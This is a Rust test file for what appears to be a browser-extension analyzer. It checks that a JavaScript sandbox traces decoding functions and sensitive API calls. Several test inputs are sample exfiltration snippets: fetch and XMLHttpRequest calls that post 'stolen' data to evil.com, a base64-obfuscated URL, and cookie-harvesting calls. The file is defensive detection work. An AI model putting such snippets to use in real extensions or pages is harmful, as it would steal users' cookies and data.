use extanalyzer::sandbox::execute_snippet;

#[test]
fn test_atob_decoding() {
    let result = execute_snippet("atob('aGVsbG8=')", 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    // The prelude may use String.fromCharCode internally, so we check for atob specifically
    let atob_decode = result
        .decoded_strings
        .iter()
        .find(|d| d.function == "atob");
    assert!(
        atob_decode.is_some(),
        "Expected atob decode, got: {:?}",
        result.decoded_strings
    );
    let atob_decode = atob_decode.unwrap();
    assert_eq!(atob_decode.input, "aGVsbG8=");
    assert_eq!(atob_decode.output, "hello");
}

#[test]
fn test_btoa_encoding() {
    let result = execute_snippet("btoa('hello')", 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    let btoa_decode = result
        .decoded_strings
        .iter()
        .find(|d| d.function == "btoa");
    assert!(
        btoa_decode.is_some(),
        "Expected btoa decode, got: {:?}",
        result.decoded_strings
    );
    let btoa_decode = btoa_decode.unwrap();
    assert_eq!(btoa_decode.input, "hello");
    assert_eq!(btoa_decode.output, "aGVsbG8=");
}

#[test]
fn test_fromcharcode_decoding() {
    let result = execute_snippet("String.fromCharCode(72, 101, 108, 108, 111)", 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    let fromcharcode_decode = result
        .decoded_strings
        .iter()
        .find(|d| d.function == "String.fromCharCode" && d.output == "Hello");
    assert!(
        fromcharcode_decode.is_some(),
        "Expected String.fromCharCode decode with 'Hello', got: {:?}",
        result.decoded_strings
    );
    assert_eq!(result.final_value, Some("Hello".to_string()));
}

#[test]
fn test_fetch_tracing() {
    let result = execute_snippet(
        "fetch('https://evil.com/collect', { method: 'POST', body: 'data' })",
        1000,
    );
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    assert_eq!(result.api_calls.len(), 1);
    assert_eq!(result.api_calls[0].function, "fetch");
    // Arguments are JSON values
    assert_eq!(
        result.api_calls[0].arguments[0],
        serde_json::json!("https://evil.com/collect")
    );
}

#[test]
fn test_xhr_tracing() {
    let code = r#"
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://evil.com/data');
        xhr.send('stolen_data');
    "#;
    let result = execute_snippet(code, 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    assert!(result.api_calls.len() >= 2);
    assert!(
        result
            .api_calls
            .iter()
            .any(|c| c.function == "XMLHttpRequest.open")
    );
    assert!(
        result
            .api_calls
            .iter()
            .any(|c| c.function == "XMLHttpRequest.send")
    );
}

#[test]
fn test_chrome_api_tracing() {
    let code = "chrome.cookies.getAll({ domain: '.github.com' })";
    let result = execute_snippet(code, 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    assert_eq!(result.api_calls.len(), 1);
    assert_eq!(result.api_calls[0].function, "chrome.cookies.getAll");
}

#[test]
fn test_document_cookie_tracing() {
    let code = "var c = document.cookie; document.cookie = 'stolen=true';";
    let result = execute_snippet(code, 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    assert!(
        result
            .api_calls
            .iter()
            .any(|c| c.function == "document.cookie.get")
    );
    assert!(
        result
            .api_calls
            .iter()
            .any(|c| c.function == "document.cookie.set")
    );
}

#[test]
fn test_localstorage_tracing() {
    let code = r#"
        localStorage.setItem('key', 'value');
        localStorage.getItem('key');
    "#;
    let result = execute_snippet(code, 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    assert!(
        result
            .api_calls
            .iter()
            .any(|c| c.function == "localStorage.setItem")
    );
    assert!(
        result
            .api_calls
            .iter()
            .any(|c| c.function == "localStorage.getItem")
    );
}

#[test]
fn test_combined_obfuscation() {
    // Simulates real obfuscation: base64 decode then use
    let code = r#"
        var url = atob('aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA==');
        fetch(url, { method: 'POST' });
    "#;
    let result = execute_snippet(code, 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);

    // Should decode the URL
    let atob_decode = result
        .decoded_strings
        .iter()
        .find(|d| d.function == "atob");
    assert!(
        atob_decode.is_some(),
        "Expected atob decode, got: {:?}",
        result.decoded_strings
    );
    assert_eq!(atob_decode.unwrap().output, "https://evil.com/steal");

    // Should trace the fetch with decoded URL
    assert_eq!(result.api_calls.len(), 1);
    assert_eq!(
        result.api_calls[0].arguments[0],
        serde_json::json!("https://evil.com/steal")
    );
}

#[test]
fn test_syntax_error_returns_error() {
    let result = execute_snippet("this is not { valid javascript", 1000);
    assert!(result.error.is_some());
}

#[test]
fn test_timeout_returns_partial_results() {
    // Decode something, then infinite loop
    let code = r#"
        atob('dGVzdA==');
        while(true) {}
    "#;
    let result = execute_snippet(code, 100); // Short timeout

    // Should have partial results from before the loop OR an error
    // The atob decode happens before the loop, so we may capture it
    // But the timeout may also trigger before trace is retrieved
    assert!(
        result.decoded_strings.iter().any(|d| d.function == "atob") || result.error.is_some(),
        "Expected either atob decode or error, got: {:?}",
        result
    );
}

#[test]
fn test_reference_error_captured() {
    let result = execute_snippet("unknownVariable", 1000);
    assert!(result.error.is_some());
}

#[test]
fn test_final_value_captured() {
    let result = execute_snippet("1 + 2 + 3", 1000);
    assert!(result.error.is_none());
    assert_eq!(result.final_value, Some("6".to_string()));
}

#[test]
fn test_string_final_value() {
    let result = execute_snippet("'hello' + ' world'", 1000);
    assert!(result.error.is_none());
    assert_eq!(result.final_value, Some("hello world".to_string()));
}
